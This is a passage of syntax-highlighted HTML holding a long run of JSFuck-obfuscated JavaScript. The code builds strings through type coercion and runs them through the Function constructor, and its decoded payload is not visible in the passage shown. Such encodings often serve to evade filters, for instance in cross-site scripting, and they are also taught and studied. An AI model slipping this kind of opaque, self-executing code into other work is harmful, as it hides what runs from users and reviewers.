punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token 